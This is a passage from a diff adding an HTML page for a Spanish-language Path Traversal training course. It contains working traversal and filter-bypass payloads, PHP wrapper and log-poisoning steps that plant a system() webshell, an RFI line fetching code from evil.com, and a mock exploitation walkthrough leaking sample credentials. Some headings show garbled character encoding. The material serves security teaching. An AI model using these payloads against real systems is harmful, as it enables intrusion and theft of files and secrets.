+.kbd { font-family: var(--font-mono); font-size: 0.85em; background: var(--c-surface-raised); border: 1px solid var(--c-border); border-radius: var(--radius-xs); padding: 1px 6px; }
+
+/* ---------- Modo presentaciÃ³n ---------- */
+:root[data-mode="present"] {
+  --fs-body: clamp(1.25rem, 1.05rem + 0.9vw, 1.625rem);
+  --fs-body-lg: clamp(1.375rem, 1.15rem + 1.1vw, 1.875rem);
+  --fs-h1: clamp(2.75rem, 2.0rem + 3.6vw, 4.25rem);
+  --fs-h2: clamp(2.0rem, 1.6rem + 2.2vw, 3.0rem);
+  --fs-h3: clamp(1.5rem, 1.3rem + 1.0vw, 2.0rem);
+  --fs-code: clamp(1.0rem, 0.92rem + 0.4vw, 1.25rem);
+  --icon-stroke: 1.75;
+  --measure: 64ch;
+  --col-main-max: 900px;
+  --space-section: clamp(5rem, 3rem + 8vw, 9rem);
+  --c-text-secondary: #3F3F3F;
+  --c-border: #DBDBD8;
+}
+:root[data-theme="dark"][data-mode="present"] { --c-text-secondary: #C4C1BC; --c-border: #3A3835; }
+:root[data-mode="present"] .sidebar,
+:root[data-mode="present"] .header__toc-btn { display: none; }
+:root[data-mode="present"] .shell { grid-template-columns: 1fr; }
+:root[data-mode="present"] main { max-width: var(--col-main-max); margin-inline: auto; }
+:root[data-mode="present-slides"] .section { min-height: 100dvh; display: flex; flex-direction: column; justify-content: center; }
+
+@media (prefers-reduced-motion: reduce) {
+  *, *::before, *::after {
+    animation-duration: 0.01ms !important;
+    animation-iteration-count: 1 !important;
+    transition-duration: 0.01ms !important;
+    scroll-behavior: auto !important;
+  }
+  .vuln.is-arrived { background: transparent; }
+}
+
+</style>
+</head>
+<body>
+<a class="skip-link" href="#main">Saltar al contenido</a>
+<div class="read-progress" role="progressbar" aria-label="Progreso de lectura" aria-valuemin="0" aria-valuemax="100" aria-valuenow="0"></div>
+
+<header class="header" data-scrolled="false">
+  <button class="icon-btn header__toc-btn" type="button" aria-label="Abrir el temario" aria-expanded="false" aria-controls="drawer">
+    <svg class="ico" viewBox="0 0 24 24" aria-hidden="true"><line x1="3" y1="6" x2="21" y2="6"/><line x1="3" y1="12" x2="21" y2="12"/><line x1="3" y1="18" x2="21" y2="18"/></svg>
+  </button>
+  <a class="header__title" href="#top">Path Traversal</a>
+  <button class="icon-btn" id="theme-toggle" type="button" aria-pressed="false" aria-label="Cambiar tema">
+    <svg class="ico" viewBox="0 0 24 24" aria-hidden="true"><circle cx="12" cy="12" r="4"/><path d="M12 2v2M12 20v2M4.9 4.9l1.4 1.4M17.7 17.7l1.4 1.4M2 12h2M20 12h2M4.9 19.1l1.4-1.4M17.7 6.3l1.4-1.4"/></svg>
+  </button>
+  <button class="icon-btn" id="present-toggle" type="button" aria-pressed="false" aria-label="Modo proyección (tecla P)">
+    <svg class="ico" viewBox="0 0 24 24" aria-hidden="true"><path d="M2 3h20M4 3v11a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V3M12 16v5M8 21h8"/></svg>
+  </button>
+</header>
+
+<div class="drawer-overlay" data-open="false"></div>
+<aside class="drawer" id="drawer" role="dialog" aria-modal="true" aria-label="Temario" data-open="false">
+  <div class="drawer__head">
+    <p class="toc__title">Temario</p>
+    <button class="icon-btn" type="button" id="drawer-close" aria-label="Cerrar el temario">
+      <svg class="ico" viewBox="0 0 24 24" aria-hidden="true"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
+    </button>
+  </div>
+  <nav class="toc" aria-label="Temario"><ol id="toc-mobile"></ol></nav>
+</aside>
+
+<div class="shell" id="top">
+  <aside class="sidebar">
+    <nav class="toc" aria-label="Temario">
+      <p class="toc__title">Temario</p>
+      <ol id="toc-desktop"></ol>
+    </nav>
+  </aside>
+
+  <main id="main">
+    <header class="hero">
+      <div class="utility-bar">
+        <button class="icon-btn" id="theme-toggle-hero" type="button" aria-pressed="false" aria-label="Cambiar tema">
+          <svg class="ico" viewBox="0 0 24 24" aria-hidden="true"><circle cx="12" cy="12" r="4"/><path d="M12 2v2M12 20v2M4.9 4.9l1.4 1.4M17.7 17.7l1.4 1.4M2 12h2M20 12h2M4.9 19.1l1.4-1.4M17.7 6.3l1.4-1.4"/></svg>
+        </button>
+        <button class="icon-btn" id="present-toggle-hero" type="button" aria-pressed="false" aria-label="Modo proyección">
+          <svg class="ico" viewBox="0 0 24 24" aria-hidden="true"><path d="M2 3h20M4 3v11a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V3M12 16v5M8 21h8"/></svg>
+        </button>
+      </div>
+      <p class="eyebrow">Formación en ciberseguridad</p>
+      <h1>Path Traversal: accediendo a lo que no debes</h1>
+      <p class="hero__lead">Una sesión de tres horas sobre Directory Traversal: cómo funciona, por qué sigue apareciendo, técnicas de bypass para superar filtros y sanitizadores, explotación en distintas plataformas y las mejores prácticas para prevenirlo.</p>
+      <dl class="hero__meta">
+        <div><dt>Duración</dt><dd>3 horas</dd></div>
+        <div><dt>Nivel</dt><dd>Intermedio</dd></div>
+        <div><dt>Módulo</dt><dd>Web Security</dd></div>
+        <div><dt>Secciones</dt><dd>10</dd></div>
+        <div><dt>CWE</dt><dd>CWE-22, CWE-23, CWE-36</dd></div>
+      </dl>
+      <p class="hero__cta"><a href="#temario">Ir al temario</a></p>
+      <nav class="toc-static" id="temario" aria-label="Temario completo">
+        <p class="subhead">Temario</p>
+        <ol id="toc-static"></ol>
+      </nav>
+    </header>
+<!-- ===================== SECCIÓN 1 ===================== -->
+<section class="section" id="s01" aria-labelledby="s01-h">
+  <h2 id="s01-h" tabindex="-1"><span class="sec-num">01</span>Qué es el Path Traversal</h2>
+  <p class="lead-in">Una vulnerabilidad que lleva décadas en las listas de CWE y sigue matando. El atacante manipula una ruta de archivo para salir del directorio que el servidor espera y acceder a cualquier archivo del sistema.</p>
+
+  <div class="block prose">
+    <h3>La idea en una frase</h3>
+    <p><strong>Path Traversal</strong> (o Directory Traversal) es una vulnerabilidad que permite al atacante acceder a archivos y directorios que se encuentran fuera del directorio raíz de la aplicación, manipulando variables que hacen referencia a rutas de archivo.</p>
+    <p>El nombre técnico es <strong>CWE-22</strong> (Improper Limitation of a Pathname to a Restricted Directory). En la práctica, significa que el servidor confía en lo que el cliente le dice sobre qué archivo abrir, y no verifica que la ruta esté dentro de donde debería.</p>
+
+    <h3>Por qué sigue existiendo</h3>
+    <ul>
+      <li><strong>Complexidad de paths:</strong> las rutas de archivo son diferentes entre SO, lo que dificulta las pruebas.</li>
+      <li><strong>Malentendidos de sanitización:</strong> muchos desarrolladores creen que reemplazar <code>../</code> es suficiente, pero las variaciones son enormes.</li>
+      <li><strong>Bibliotecas de terceros:</strong> a menudo la vulnerable no es la aplicación sino una librería que procesa archivos.</li>
+      <li><strong>Falta de validación centralizada:</strong> cada endpoint que maneja archivos implementa su propia lógica.</li>
+    </ul>
+  </div>
+
+  <figure class="diagram bleed-wide">
+    <svg viewBox="0 0 640 260" role="img" aria-labelledby="d1-t d1-d">
+      <title id="d1-t">Cómo funciona un Path Traversal</title>
+      <desc id="d1-d">El atacante envía una ruta con ../../etc/passwd y el servidor responde con el archivo del sistema.</desc>
+      <rect class="node" x="20" y="80" width="140" height="70" rx="8"/>
+      <text class="node-label" x="90" y="105" text-anchor="middle" style="font-size:12px">Atacante</text>
+      <text class="node-label" x="90" y="122" text-anchor="middle" style="font-size:10px;fill:var(--c-text-muted)">Burp / curl</text>
+      <rect class="node" x="250" y="80" width="160" height="70" rx="8"/>
+      <text class="node-label" x="330" y="105" text-anchor="middle" style="font-size:12px">Servidor web</text>
+      <text class="node-label" x="330" y="122" text-anchor="middle" style="font-size:10px;fill:var(--c-text-muted)">Node.js / PHP / Java</text>
+      <rect class="node" x="490" y="80" width="130" height="70" rx="8"/>
+      <text class="node-label" x="555" y="105" text-anchor="middle" style="font-size:12px">Sistema de archivos</text>
+      <text class="node-label" x="555" y="122" text-anchor="middle" style="font-size:10px;fill:var(--c-text-muted)">/etc/passwd</text>
+      <path class="conn-accent" d="M160 105 L248 105" marker-end="url(#arrow-pt)"/>
+      <text class="flow-label" x="204" y="95" text-anchor="middle">GET /api/file?name=../../etc/passwd</text>
+      <path class="conn" d="M410 105 L488 105" marker-end="url(#arrow-pt)"/>
+      <text class="flow-label" x="449" y="95" text-anchor="middle">open(../../etc/passwd)</text>
+      <path class="conn" d="M488 125 L410 125" marker-end="url(#arrow-pt)"/>
+      <text class="flow-label" x="449" y="145" text-anchor="middle">Contenido del archivo</text>
+      <defs>
+        <marker id="arrow-pt" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M0 0 L10 5 L0 10 z" fill="var(--c-accent)"/></marker>
+      </defs>
+    </svg>
+    <figcaption>El servidor confía en la ruta que envía el cliente y accede a un archivo fuera del directorio previsto.</figcaption>
+  </figure>
+
+  <div class="block prose">
+    <h3>Diferencia con SSRF</h3>
+    <p>No confundir con <strong>Server-Side Request Forgery</strong> (SSRF). En SSRF el servidor hace peticiones HTTP a recursos internos; en Path Traversal, el servidor lee archivos del propio sistema de archivos local.</p>
+  </div>
+
+  <div class="block prose">
+    <h3>Impacto</h3>
+    <ul>
+      <li><strong>Lectura de archivos del sistema:</strong> <code>/etc/passwd</code>, <code>/etc/shadow</code>, configuraciones de base de datos.</li>
+      <li><strong>Lectura de código fuente:</strong> evaluar la lógica de la aplicación para encontrar más vulnerabilidades.</li>
+      <li><strong>Lectura de llaves y tokens:</strong> archivos <code>.env</code>, certificados SSL, tokens JWT.</li>
+      <li><strong>Escritura arbitraria</strong> (en algunos casos): crear o sobrescribir archivos en ubicaciones controladas.</li>
+      <li><strong>Ejecución remota de código:</strong> cuando se combina con includes (LFI) o log poisoning.</li>
+    </ul>
+  </div>
+
+  <aside class="callout callout--warn" role="note">
+    <p class="callout__label"><svg viewBox="0 0 24 24" aria-hidden="true"><path d="M10.29 3.86 1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg> Aviso</p>
+    <p>Path Traversal puede ser tanto de lectura como de escritura. La escritura es menos común pero mucho más peligrosa: permite crear archivos PHP en el directorio web para ejecutar código remoto.</p>
+  </aside>
+</section>
+<!-- ===================== SECCIÓN 2 ===================== -->
+<section class="section" id="s02" aria-labelledby="s02-h">
+  <h2 id="s02-h" tabindex="-1"><span class="sec-num">02</span>Tipos de Path Traversal</h2>
+  <p class="lead-in">No todos los traversals son iguales. La diferencia entre una lectura simple y una ejecución remota de código está en cómo se usa la ruta manipulada.</p>
+
+  <div class="block">
+    <p class="subhead">Clasificación</p>
+    <h3>Por el tipo de operación</h3>
+    <div class="deftable bleed-wide">
+      <table>
+        <thead><tr><th scope="col">Tipo</th><th scope="col">Descripción</th><th scope="col">Impacto</th></tr></thead>
+        <tbody>
+          <tr><td>Lectura (LFI)</td><td>Leer archivos del sistema de archivos local</td><td>Filtración de datos, código fuente, credenciales</td></tr>
+          <tr><td>Escritura</td><td>Crear o sobrescribir archivos en ubicaciones controladas</td><td>Webshell, defacement, corrupción de datos</td></tr>
+          <tr><td>Ejecución (LFI→RCE)</td><td>Incluir un archivo PHP malicioso o usar log poisoning</td><td>Remota de código completo</td></tr>
+          <tr><td>Null byte (histórico)</td><td>Inyectar <code>%00</code> para truncar la ruta</td><td>Bypass de extensiones forzadas</td></tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+
+  <div class="block">
+    <p class="subhead">LFI vs. RFI</p>
+    <h3>Local File Inclusion vs. Remote File Inclusion</h3>
+    <div class="deftable bleed-wide">
+      <table>
+        <thead><tr><th scope="col">Aspecto</th><th scope="col">LFI</th><th scope="col">RFI</th></tr></thead>
+        <tbody>
+          <tr><td>Archivo incluido</td><td>Del servidor local</td><td>De un servidor remoto controlado por el atacante</td></tr>
+          <tr><td>Requisito</td><td>Solo Path Traversal</td><td>Path Traversal + <code>allow_url_include=On</code> (PHP)</td></tr>
+          <tr><td>Frecuencia</td><td>Muy común</td><td>Raro (deshabilitado por defecto)</td></tr>
+          <tr><td>Ejemplo</td><td><code>?page=../../etc/passwd</code></td><td><code>?page=http://evil.com/shell.txt</code></td></tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+
+  <div class="block">
+    <p class="subhead">Plataformas</p>
+    <h3>Cómo se comporta en distintos entornos</h3>
+    <div class="deftable bleed-wide">
+      <table>
+        <thead><tr><th scope="col">Plataforma</th><th scope="col">Características</th></tr></thead>
+        <tbody>
+          <tr><td>Linux</td><td>Rutas con <code>/</code>, archivos sensibles: <code>/etc/passwd</code>, <code>/etc/shadow</code>, <code>/proc/self/environ</code></td></tr>
+          <tr><td>Windows</td><td>Rutas con <code>\</code> o <code>/</code>, archivos sensibles: <code>C:\Windows\System32\config\SAM</code>, <code>win.ini</code></td></tr>
+          <tr><td>PHP</td><td>El más vulnerable: <code>include()</code>, <code>require()</code>, <code>file_get_contents()</code></td></tr>
+          <tr><td>Java</td><td><code>FileInputStream</code>, <code>Paths.get()</code>. Rutas con <code>../</code> funcionan igual</td></tr>
+          <tr><td>Node.js</td><td><code>fs.readFile()</code>, <code>path.join()</code>. Validación manual frecuentemente insuficiente</td></tr>
+          <tr><td>.NET</td><td><code>File.ReadAllText()</code>, <code>Server.MapPath()</code>. Normalización del SO</td></tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+
+  <aside class="callout callout--note" role="note">
+    <p class="callout__label"><svg viewBox="0 0 24 24" aria-hidden="true"><circle cx="12" cy="12" r="10"/><line x1="12" y1="16" x2="12" y2="12"/><line x1="12" y1="8" x2="12.01" y2="8"/></svg> Nota</p>
+    <p>En Windows, <code>../</code> y <code>..\</code> son equivalentes. Muchos filtros solo bloquean <code>../</code> y se saltan con <code>..\/</code> o <code>..%5c</code>. En Linux, el separador es solo <code>/</code>.</p>
+  </aside>
+</section>
+
+<!-- ===================== SECCIÃ“N 3 ===================== -->
+<section class="section" id="s03" aria-labelledby="s03-h">
+  <h2 id="s03-h" tabindex="-1"><span class="sec-num">03</span>TÃ©cnicas de bypass</h2>
+  <p class="lead-in">Cuando hay un filtro, hay una forma de saltÃ¡rselo. Estas son las tÃ©cnicas mÃ¡s habituales que encontrarÃ¡s en el campo.</p>
+
+  <div class="block">
+    <p class="subhead">BÃ¡sico</p>
+    <h3>Variaciones del path traversal</h3>
+    <figure class="exchange bleed-wide">
+      <div class="exchange__grid">
+        <div class="exchange__panel">
+          <p class="exchange__head"><svg viewBox="0 0 24 24" aria-hidden="true"><line x1="7" y1="17" x2="17" y2="7"/><polyline points="7 7 17 7 17 17"/></svg> Payloads bÃ¡sicos <span class="exchange__meta">Linux</span></p>
+          <pre><code><span class="tok-comment"># ClÃ¡sico</span>
+../../../etc/passwd
+
+<span class="tok-comment"># URL encoding</span>
+..%2f..%2f..%2fetc%2fpasswd
+
+<span class="tok-comment"># Doble encoding</span>
+..%252f..%252f..%252fetc%252fpasswd
+
+<span class="tok-comment"># Non-standard encoding</span>
+..%c0%af..%c0%af..%c0%afetc/passwd
+
+<span class="tok-comment"># Bypass con barra invertida</span>
+..\..\..\etc\passwd
+
+<span class="tok-comment"># Bypass con barra mixta</span>
+..\../..\../etc/passwd</code></pre>
+        </div>
+        <div class="exchange__panel">
+          <p class="exchange__head"><svg viewBox="0 0 24 24" aria-hidden="true"><line x1="7" y1="17" x2="17" y2="7"/><polyline points="7 7 17 7 17 17"/></svg> Payloads Windows <span class="exchange__meta">IIS</span></p>
+          <pre><code><span class="tok-comment"># ClÃ¡sico</span>
+..\..\..\windows\win.ini
+
+<span class="tok-comment"># URL encoding</span>
+..%5c..%5c..%5cwindows%5cwin.ini
+
+<span class="tok-comment"># Doble encoding</span>
+..%255c..%255c..%255cwindows%5cwin.ini
+
+<span class="tok-comment"># Bypass con barra normal</span>
+../../windows/win.ini
+
+<span class="tok-comment"># Bypass con sufijo</span>
+..\..\..\windows\win.ini::$DATA
+
+<span class="tok-comment"># UNC path (acceso remoto)</span>
+\\attacker.com\share\file.txt</code></pre>
+        </div>
+      </div>
+    </figure>
+  </div>
+
+  <div class="block">
+    <p class="subhead">Avanzado</p>
+    <h3>Bypass de filtros especÃ­ficos</h3>
+
+    <div class="deftable bleed-wide">
+      <table>
+        <thead><tr><th scope="col">Filtro</th><th scope="col">Bypass</th><th scope="col">Payload</th></tr></thead>
+        <tbody>
+          <tr><td>Reemplazo de <code>../</code></td><td>Aplicar recursivamente</td><td><code>....//....//</code></td></tr>
+          <tr><td>Bloqueo de <code>../</code></td><td>URL encoding</td><td><code>..%2f..%2f</code></td></tr>
+          <tr><td>Bloqueo de <code>..</code></td><td>Encoding variado</td><td><code>..%00/</code>, <code>..%0d%0a/</code></td></tr>
+          <tr><td>Bloqueo de <code>/</code></td><td>Barra invertida</td><td><code>..\..\..</code></td></tr>
+          <tr><td>Extensiones forzadas</td><td>Null byte</td><td><code>../../etc/passwd%00.php</code></td></tr>
+          <tr><td>ValidaciÃ³n de inicio</td><td>Ruta absoluta</td><td><code>/etc/passwd</code></td></tr>
+          <tr><td>ValidaciÃ³n de directorio</td><td>SÃ­mbolo de enlace</td><td><code>./uploads/../../etc/passwd</code></td></tr>
+          <tr><td>Bloqueo de palabras clave</td><td>Variables de entorno</td><td><code>${PATH:0:1}etc${PATH:0:1}passwd</code></td></tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+
+  <div class="block">
+    <p class="subhead">PHP especÃ­fico</p>
+    <h3>Bypasses caracterÃ­sticos de PHP</h3>
+    <figure class="exchange bleed-wide">
+      <div class="exchange__grid">
+        <div class="exchange__panel">
+          <p class="exchange__head"><svg viewBox="0 0 24 24" aria-hidden="true"><line x1="7" y1="17" x2="17" y2="7"/><polyline points="7 7 17 7 17 17"/></svg> LFI â†’ RCE en PHP <span class="exchange__meta">Log poisoning</span></p>
+          <pre><code><span class="tok-comment"># 1. Inyectar cÃ³digo PHP en el log de Apache</span>
+$ curl -A '&lt;?php system($_GET["cmd"]); ?&gt;' \
+  http://target/admin/
+
+<span class="tok-comment"># 2. Incluir el log vÃ­a path traversal</span>
+GET /vuln.php?page=../../var/log/apache2/access.log&amp;cmd=id
+
+<span class="tok-comment"># Resultado:</span>
+uid=33(www-data) gid=33(www-data) groups=33(www-data)</code></pre>
+        </div>
+        <div class="exchange__panel">
+          <p class="exchange__head"><svg viewBox="0 0 24 24" aria-hidden="true"><line x1="7" y1="17" x2="17" y2="7"/><polyline points="7 7 17 7 17 17"/></svg> Wrappers de PHP <span class="exchange__meta">file://</span></p>
+          <pre><code><span class="tok-comment"># Wrapper file://</span>
+?page=file:///etc/passwd
+
+<span class="tok-comment"># Wrapper php://filter</span>
+?page=php://filter/convert.base64-encode/resource=index.php
+
+<span class="tok-comment"># Wrapper data://</span>
+?page=data://text/plain;base64,PD9waHAgc3lzdGVt...
+
+<span class="tok-comment"># Wrapper expect://</span>
+?page=expect://id
+
+<span class="tok-comment"># Zip wrapper</span>
+?page=zip://shell.jpg%23shell.php</code></pre>
+        </div>
+      </div>
+    </figure>
+  </div>
+
+  <div class="block">
+    <p class="subhead">Pruebas</p>
+    <h3>CÃ³mo detectar Path Traversal</h3>
+    <div class="deftable bleed-wide">
+      <table>
+        <thead><tr><th scope="col">MÃ©todo</th><th scope="col">CÃ³mo</th></tr></thead>
+        <tbody>
+          <tr><td>InyecciÃ³n de path</td><td>Probar <code>../</code>, <code>..%2f</code>, <code>..\\</code> en cada parÃ¡metro</td></tr>
+          <tr><td>Observar errores</td><td>Un error 400 con la ruta expuesta confirma procesamiento</td></tr>
+          <tr><td>Archivos canarios</td><td>Crear un archivo conocido y tratar de leerlo</td></tr>
+          <tr><td>Timing attack</td><td>Si la ruta larga tarda mÃ¡s, estÃ¡ procesando la ruta</td></tr>
+          <tr><td>Doble encoding</td><td>Si <code>../</code> estÃ¡ filtrado, probar <code>%252f</code></td></tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+
+  <aside class="callout callout--danger" role="note">
+    <p class="callout__label"><svg viewBox="0 0 24 24" aria-hidden="true"><polygon points="7.86 2 16.14 2 22 7.86 22 16.14 16.14 22 7.86 22 2 16.14 2 7.86 7.86 2"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/></svg> Peligro</p>
+    <p>Un solo reemplazo de <code>../</code> nunca es suficiente. Los filtros que solo buscan la cadena exacta son triviales de superar con encoding, doble encoding o variaciones de formato.</p>
+  </aside>
+</section>
+
+<!-- ===================== SECCIÃ“N 4 ===================== -->
+<section class="section" id="s04" aria-labelledby="s04-h">
+  <h2 id="s04-h" tabindex="-1"><span class="sec-num">04</span>Herramientas de exploraciÃ³n</h2>
+  <p class="lead-in">Para encontrar y explotar Path Traversal necesitas las herramientas correctas. Cada una tiene su nicho: algunas detectan, otras explotan, otras automatizan.</p>
+
+  <div class="block">
+    <p class="subhead">DetecciÃ³n</p>
+    <h3>Herramientas de scanning</h3>
+    <div class="deftable bleed-wide">
+      <table>
+        <thead><tr><th scope="col">Herramienta</th><th scope="col">Uso principal</th><th scope="col">CaracterÃ­sticas</th></tr></thead>
+        <tbody>
+          <tr><td><code>Nikto</code></td><td>Scanner web general</td><td>Detecta Path Traversal junto con otras vulnerabilidades. Buen primer barrido.</td></tr>
+          <tr><td><code>OWASP ZAP</code></td><td>Scanner automÃ¡tico + manual</td><td>Active Scan con payloads de traversal. Spider para descubrir endpoints.</td></tr>
+          <tr><td><code>Burp Suite</code></td><td>Proxy y scanner</td><td>Intruder con payloads de traversal. Comparar tamaÃ±os de respuesta.</td></tr>
+          <tr><td><code>dirsearch</code></td><td>Fuzzing de directorios</td><td>Wordlists especÃ­ficas para archivos sensibles del sistema.</td></tr>
+          <tr><td><code>ffuf</code></td><td>Fuzzing rÃ¡pido</td><td>Comparar respuestas por tamaÃ±o y cÃ³digo para detectar archivos accesibles.</td></tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+
+  <div class="block">
+    <p class="subhead">ExplotaciÃ³n</p>
+    <h3>Herramientas de explotaciÃ³n</h3>
+    <div class="deftable bleed-wide">
+      <table>
+        <thead><tr><th scope="col">Herramienta</th><th scope="col">Uso principal</th><th scope="col">CaracterÃ­sticas</th></tr></thead>
+        <tbody>
+          <tr><td><code>Burp Intruder</code></td><td>Fuzzing parametrizado</td><td>Payloads de traversal con encoding variable. Comparar respuestas.</td></tr>
+          <tr><td><code>commix</code></td><td>InyecciÃ³n de comandos</td><td>Automatiza LFI â†’ RCE cuando es posible.</td></tr>
+          <tr><td><code>LFI Suite</code></td><td>LFI automatizado</td><td>Prueba wrappers de PHP, log poisoning, y mÃºltiples tÃ©cnicas.</td></tr>
+          <tr><td><code>curl</code></td><td>Peticiones manuales</td><td>Control total sobre headers, encoding, y mÃ©todo HTTP.</td></tr>
+          <tr><td><code>Python requests</code></td><td>Scripts personalizados</td><td>Automatizar bypasses especÃ­ficos para la aplicaciÃ³n objetivo.</td></tr>
+        </tbody>
+      </table>
+    </div>
+  </div>
+
+  <div class="block">
+    <p class="subhead">Workflow</p>
+    <h3>Flujo de trabajo recomendado</h3>
+    <figure class="diagram bleed-wide">
+      <svg viewBox="0 0 640 300" role="img" aria-labelledby="d2-t d2-d">
+        <title id="d2-t">Flujo de trabajo de Path Traversal</title>
+        <desc id="d2-d">Fases: descubrir endpoints, inyectar paths, observar respuestas, escalar a RCE.</desc>
+        <rect class="node" x="20" y="40" width="130" height="50" rx="8"/>
+        <text class="node-label" x="85" y="70" text-anchor="middle" style="font-size:11px">1. Descubrir endpoints</text>
+        <rect class="node" x="180" y="40" width="130" height="50" rx="8"/>
+        <text class="node-label" x="245" y="70" text-anchor="middle" style="font-size:11px">2. Inyectar paths</text>
+        <rect class="node" x="340" y="40" width="130" height="50" rx="8"/>
+        <text class="node-label" x="405" y="70" text-anchor="middle" style="font-size:11px">3. Observar respuestas</text>
+        <rect class="node" x="500" y="40" width="120" height="50" rx="8"/>
+        <text class="node-label" x="560" y="70" text-anchor="middle" style="font-size:11px">4. Escalar</text>
+        <path class="conn-accent" d="M150 65 L178 65" marker-end="url(#arrow-h)"/>
+        <path class="conn-accent" d="M310 65 L338 65" marker-end="url(#arrow-h)"/>
+        <path class="conn-accent" d="M470 65 L498 65" marker-end="url(#arrow-h)"/>
+
+        <rect class="node" x="20" y="140" width="600" height="120" rx="8" style="stroke:var(--c-border);stroke-width:1;fill:var(--c-surface-raised)"/>
+        <text class="node-label" x="320" y="165" text-anchor="middle" style="font-size:11px;fill:var(--c-text-muted)">TÃ©cnicas de bypass (secciÃ³n 03)</text>
+        <text class="node-label" x="120" y="200" text-anchor="middle" style="font-size:10px">URL encoding</text>
+        <text class="node-label" x="260" y="200" text-anchor="middle" style="font-size:10px">Doble encoding</text>
+        <text class="node-label" x="400" y="200" text-anchor="middle" style="font-size:10px">Null bytes</text>
+        <text class="node-label" x="530" y="200" text-anchor="middle" style="font-size:10px">Wrappers PHP</text>
+        <text class="node-label" x="120" y="230" text-anchor="middle" style="font-size:10px">Log poisoning</text>
+        <text class="node-label" x="260" y="230" text-anchor="middle" style="font-size:10px">Path injection</text>
+        <text class="node-label" x="400" y="230" text-anchor="middle" style="font-size:10px">OS-specific</text>
+        <text class="node-label" x="530" y="230" text-anchor="middle" style="font-size:10px">Filter bypass</text>
+        <defs>
+          <marker id="arrow-h" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="7" markerHeight="7" orient="auto-start-reverse"><path d="M0 0 L10 5 L0 10 z" fill="var(--c-accent)"/></marker>
+        </defs>
+      </svg>
+      <figcaption>Cada fase puede retroalimentar a la anterior: si un bypass falla, se prueba otro.</figcaption>
+    </figure>
+  </div>
+
+  <aside class="callout callout--note" role="note">
+    <p class="callout__label"><svg viewBox="0 0 24 24" aria-hidden="true"><circle cx="12" cy="12" r="10"/><line x1="12" y1="16" x2="12" y2="12"/><line x1="12" y1="8" x2="12.01" y2="8"/></svg> Nota</p>
+    <p>No automatices ciegamente. Las herramientas detectan patrones conocidos; el criterio humano sigue siendo necesario para identificar bypasses no estÃ¡ndar y escalar de LFI a RCE.</p>
+  </aside>
+</section>
+
+<!-- ===================== SECCIÃ“N 5 ===================== -->
+<section class="section" id="s05" aria-labelledby="s05-h">
+  <h2 id="s05-h" tabindex="-1"><span class="sec-num">05</span>ExplotaciÃ³n paso a paso</h2>
+  <p class="lead-in">Un recorrido prÃ¡ctico desde la detecciÃ³n inicial hasta la escalada completa, con cada paso documentado.</p>
+
+  <div class="block">
+    <p class="subhead">Escenario</p>
+    <h3>Objetivo: <code>fileserver.ejemplo.com</code></h3>
+    <p class="prose">AplicaciÃ³n web para descargar documentos. Un formulario acepta el nombre del archivo y lo devuelve. El parÃ¡metro es <code>file</code>.</p>
+  </div>
+
+  <div class="block">
+    <p class="subhead">Paso 1</p>
+    <h3>DetecciÃ³n inicial</h3>
+    <figure class="exchange bleed-wide">
+      <div class="exchange__grid">
+        <div class="exchange__panel">
+          <p class="exchange__head"><svg viewBox="0 0 24 24" aria-hidden="true"><line x1="7" y1="17" x2="17" y2="7"/><polyline points="7 7 17 7 17 17"/></svg> PeticiÃ³n normal <span class="exchange__meta">GET</span></p>
+          <pre><code><span class="tok-method">GET</span> <span class="tok-path">/download?file=report.pdf</span> HTTP/1.1
+<span class="tok-header-name">Host:</span> fileserver.ejemplo.com
+
+<span class="tok-comment"># Respuesta: 200 OK, Content-Type: application/pdf</span>
+<span class="tok-comment"># Se descarga el PDF correctamente</span></code></pre>
+        </div>
+        <div class="exchange__panel">
+          <p class="exchange__head"><svg viewBox="0 0 24 24" aria-hidden="true"><line x1="7" y1="17" x2="17" y2="7"/><polyline points="7 7 17 7 17 17"/></svg> Prueba de traversal <span class="exchange__meta">GET</span></p>
+          <pre><code><span class="tok-method">GET</span> <span class="tok-path">/download?file=../../../etc/passwd</span> HTTP/1.1
+<span class="tok-header-name">Host:</span> fileserver.ejemplo.com
+
+<span class="tok-comment"># Respuesta: 200 OK</span>
+<span class="tok-comment"># Contenido:</span>
+<mark class="tok-attack">root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</mark></code></pre>
+        </div>
+      </div>
+      <figcaption>El servidor devuelve el contenido de /etc/passwd. Path Traversal confirmado.</figcaption>
+    </figure>
+  </div>
+
+  <div class="block">
+    <p class="subhead">Paso 2</p>
+    <h3>ExplotaciÃ³n de archivos sensibles</h3>
+    <figure class="exchange bleed-wide">
+      <div class="exchange__grid">
+        <div class="exchange__panel">
+          <p class="exchange__head"><svg viewBox="0 0 24 24" aria-hidden="true"><line x1="7" y1="17" x2="17" y2="7"/><polyline points="7 7 17 7 17 17"/></svg> ConfiguraciÃ³n <span class="exchange__meta">GET</span></p>
+          <pre><code><span class="tok-comment"># Archivo de configuraciÃ³n de la app</span>
+/download?file=../../../var/www/app/config/database.yml
+
+<span class="tok-comment"># Respuesta 200 con credenciales:</span>
+<mark class="tok-attack"><span class="tok-string">production:
+  host: db.internal
+  username: app_prod
+  password: s3cr3tP@ss!</span></mark></code></pre>
+        </div>
+        <div class="exchange__panel">
+          <p class="exchange__head"><svg viewBox="0 0 24 24" aria-hidden="true"><line x1="7" y1="17" x2="17" y2="7"/><polyline points="7 7 17 7 17 17"/></svg> CÃ³digo fuente <span class="exchange__meta">GET</span></p>
+          <pre><code><span class="tok-comment"># CÃ³digo fuente del endpoint vulnerable</span>
+/download?file=../../../var/www/app/server.js
+
+<span class="tok-comment"># Respuesta 200 con el cÃ³digo:</span>
